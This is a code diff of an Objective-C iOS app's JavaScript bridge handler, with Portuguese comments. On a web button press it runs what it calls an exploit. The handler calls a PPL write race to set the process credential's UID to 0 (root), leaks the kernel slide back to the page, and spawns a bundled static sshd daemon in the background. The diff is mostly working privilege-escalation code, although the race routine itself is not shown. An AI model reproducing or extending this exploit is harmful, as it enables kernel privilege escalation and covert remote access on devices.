@@ -71,19 +71,35 @@ extern kern_return_t mach_vm_map(vm_map_t, mach_vm_address_t *, mach_vm_size_t, 
                  replyHandler:(void (^)(id _Nullable, NSString * _Nullable))replyHandler {
     
     NSString *action = message.body[@"action"];
+
+    // 1. Resposta para o Botão de Teste
     if ([action isEqualToString:@"test_bridge"]) {
-        replyHandler(@{@"status": @"SUCCESS", @"info": @"Catalyst-26 Active"}, nil);
-    } else if ([action isEqualToString:@"pte_patch"]) {
+        replyHandler(@{@"info": @"Catalyst-26 Ativo (A13)"}, nil);
+    } 
+    
+    // 2. Resposta para o Botão de Exploit
+    else if ([action isEqualToString:@"pte_patch"]) {
+        // Executa a escalada de privilégio
         uint64_t ucred = [self get_my_ucred_ptr];
-        if (ucred) [self ppl_write_race:(ucred + 0x18) value:0]; // Become ROOT
+        if (ucred) {
+            [self ppl_write_race:(ucred + 0x18) value:0]; // UID 0
+        }
         
+        uint64_t slide = [self getKernelSlide];
+        
+        // Retorna sucesso para o index.html
+        replyHandler(@{
+            @"status": @"SUCCESS", 
+            @"slide": [NSString stringWithFormat:@"0x%llx", slide]
+        }, nil);
+        
+        // Tenta o spawn do SSHD em background
         NSString *path = [[NSBundle mainBundle] pathForResource:@"sshd_static" ofType:nil];
-        pid_t pid = 0;
         if (path) {
+            pid_t pid;
             char *const args[] = {(char*)[path UTF8String], "-D", NULL};
             posix_spawn(&pid, [path UTF8String], NULL, NULL, args, NULL);
         }
-        replyHandler(@{@"status": @"OK", @"pid": @(pid), @"slide": [NSString stringWithFormat:@"0x%llx", _kernel_slide]}, nil);
     }
 }
 @end
